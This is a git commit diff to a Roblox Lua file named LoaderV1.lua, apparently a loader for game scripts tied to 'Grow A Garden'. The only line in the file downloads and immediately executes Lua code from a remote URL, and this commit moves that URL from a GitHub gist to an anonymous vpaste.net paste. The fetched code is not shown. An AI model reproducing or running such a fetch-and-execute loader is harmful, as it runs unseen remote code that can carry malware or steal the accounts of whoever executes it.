00c7e44b2f9bbea27a6bb63c569fd8b83d067be3
NoLag-jd <ninogwapogo@gmail.com>
2025-06-16 22:49:40 +0800

    Update LoaderV1.lua

--- Loader/LoaderV1.lua
+++ Loader/LoaderV1.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://gist.githubusercontent.com/GrowAGardenScripts2025/7175dda97638e846bc7488f6598c66df/raw/script.lua"))()
+loadstring(game:HttpGet("http://vpaste.net/KAR2T"))()
